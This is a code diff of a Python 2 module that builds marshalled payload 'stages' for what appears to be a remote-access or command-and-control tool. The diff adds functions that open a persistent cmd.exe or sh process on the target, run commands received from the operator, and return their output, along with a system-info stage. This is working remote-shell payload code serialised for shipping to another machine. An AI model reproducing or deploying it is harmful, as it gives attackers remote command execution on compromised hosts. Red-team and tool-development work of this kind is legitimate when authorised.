@@ -25,16 +25,55 @@ import pickle
 import marshal
 # from types import *
 
-def __system_shell( message ) :
+def __work_shell( storage, message ) :
     from os import popen
     result = popen( message ).read()
     return result
 
-#
-# def __error_shell( message ) :
-# 	p = Popen(cmd, stdout=PIPE, stderr=PIPE)
-# 	stdout_data, stderr_data = p.communicate()
-# 	if p.returncode != 0:
+
+
+def __init_shell_process( storage ) :
+	from subprocess import Popen, PIPE
+	import os
+	# print "Payload init()"
+	os_specs = {
+			'nt' : {'shell':'cmd.exe', 'comm_sep' : '&'},
+			'posix' : {'shell':'sh', 'comm_sep' : ';'}
+		}
+	storage['os_specs'] = os_specs
+	# print shell
+	storage['process'] = Popen( [os_specs[os.name]['shell']], stdout=PIPE, stderr=PIPE, stdin=PIPE, shell = True, bufsize = -1 )
+
+	return True
+
+def __work_shell_process( storage, message ) :
+	p = storage['process']
+	from select import select
+	from time import sleep
+	# print "Payload work()"
+	import os
+
+	mark = os.urandom(4).encode('hex')
+	command = "{command} {comm_sep} echo {token} {linesep}".format(command=message,
+		comm_sep = storage['os_specs'][os.name]['comm_sep'],
+		linesep=os.linesep,
+		token= mark)
+	print command, command.encode('hex')
+	p.stdin.write(command)
+	p.stdin.flush()
+	stdout_ret = ''
+	while True :
+		stdout_data = p.stdout.readline()
+		print "STDOUT: '%s'"% stdout_data
+		if mark in stdout_data or not stdout_data:
+			# print stdout_data.startswith(mark)
+			break
+		stdout_ret += stdout_data
+	return stdout_ret
+
+
+
+
 
 
 def __system_info( message ) :
@@ -58,6 +97,11 @@ def __system_info( message ) :
 	])
 	return ret
 
+
+
+
+def __echo( message ) :
+	return message
 
 
 
@@ -125,8 +169,23 @@ def __system_info_handler( message ) :
 
 CommonStages = {}
 CommonStages['shell'] = {}
-CommonStages['shell']['function'] = __system_shell
-CommonStages['shell']['marshal'] = marshal.dumps( __system_shell.func_code )
+CommonStages['shell']['payload'] = {}
+
+CommonStages['shell_proc'] = {}
+CommonStages['shell_proc']['payload'] = {}
+
+CommonStages['shell_proc']['payload']['init'] = __init_shell_process.func_code
+CommonStages['shell_proc']['payload']['work'] = __work_shell_process.func_code
+CommonStages['shell_proc']['marshal'] = marshal.dumps( CommonStages['shell_proc']['payload'] )
+
+CommonStages['shell']['payload']['init'] = None
+CommonStages['shell']['payload']['work'] = __work_shell.func_code
+CommonStages['shell']['marshal'] = marshal.dumps( CommonStages['shell']['payload'] )
+
+# print len(CommonStages['shell_proc']['marshal'])
+__work_shell
+# CommonStages['shell']['function'] = __system_shell
+# CommonStages['shell']['marshal'] = marshal.dumps( __system_shell.func_code )
 CommonStages['sysinfo'] = {}
 CommonStages['sysinfo']['function'] = __system_info
 CommonStages['sysinfo']['marshal'] = marshal.dumps( __system_info.func_code )
